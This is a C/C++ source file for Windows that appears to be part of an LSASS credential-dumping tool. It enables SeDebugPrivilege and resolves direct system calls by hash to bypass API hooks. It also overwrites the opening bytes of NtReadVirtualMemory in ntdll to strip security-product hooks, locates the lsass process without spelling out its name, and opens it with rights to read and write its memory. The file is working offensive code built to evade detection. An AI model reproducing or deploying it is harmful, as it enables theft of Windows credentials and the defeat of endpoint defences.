#include "Helper.h"

BOOL SetDebugPrivilege() {

    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (status != 0x0) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    LPCWSTR lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    status = NtAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (status != 0x0) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);

    return TRUE;
}


SW2_SYSCALL_LIST SW2_SyscallList = { 0,1 };

DWORD SW2_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + SW2_ROR8(Hash);
    }

    return Hash;
}

BOOL SW2_PopulateSyscallList() {

    if (SW2_SyscallList.Count) return TRUE;

    PSW2_PEB64 Peb = (PSW2_PEB64)__readgsqword(0x60);
    PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA)Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;


    LIST_ENTRY* pModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pStartListEntry = pModuleList->Flink;

    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != pModuleList; pListEntry = pListEntry->Flink) {

        PSW2_LDR_DATA_TABLE_ENTRY LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW2_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        if ((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;

    }


    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW2_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    DWORD i = 0;
    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW2_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
        if (*(USHORT*)FunctionName == 'wZ')
        {
            Entries[i].Hash = SW2_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SW2_MAX_ENTRIES) break;
        }

    } while (--NumberOfNames);

    SW2_SyscallList.Count = i;

    for (DWORD i = 0; i < SW2_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW2_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                SW2_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}

extern "C"
DWORD SW2_GetSyscallNumber(DWORD FunctionHash) {

    if (!SW2_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}

BOOL UnhookFunction() {

    BYTE AssemblyBytes[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };
    BYTE Syscall = 0x3F;
    AssemblyBytes[4] = Syscall;

    LPVOID lpProcAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtReadVirtualMemory");

    LPVOID lpBaseAddress = lpProcAddress;
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = 10;

    NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
    if (status != 0x0) {
        return FALSE;
    }

    status = NtWriteVirtualMemory(NtCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
    if (status != 0x0) {
        return FALSE;
    }

    status = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
    if (status != 0x0) {
        return FALSE;
    }

    return TRUE;
}

DWORD GetLsassPid() {

    _CreateToolhelp32Snapshot Toolhelp32Snapshot = (_CreateToolhelp32Snapshot)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateToolhelp32Snapshot");
    if (!Toolhelp32Snapshot) { return 0; }

    HANDLE hSnapshot = Toolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    _Process32FirstW MyProcess32FirstW = (_Process32FirstW)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Process32FirstW");
    if (!MyProcess32FirstW) { return 0; }
    _Process32NextW MyProcess32NextW = (_Process32NextW)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Process32NextW");
    if (!MyProcess32NextW) { return 0; }

    if (MyProcess32FirstW(hSnapshot, &pe32)) {
        do {
            if ( pe32.szExeFile[0] == 0x6c &&
                 pe32.szExeFile[1] == 0x73 && 
                 pe32.szExeFile[2] == 0x61 &&
                 pe32.szExeFile[4] == 0x73
                 ) {
                DWORD pid = pe32.th32ProcessID;
                CloseHandle(hSnapshot);
                return pid;
            }
        } while (MyProcess32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

HANDLE GetProcessHandle(DWORD dwPid) {

    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &ObjectAttributes, &uPid);
    if (hProcess == NULL) {
        return NULL;
    }

    return hProcess;
}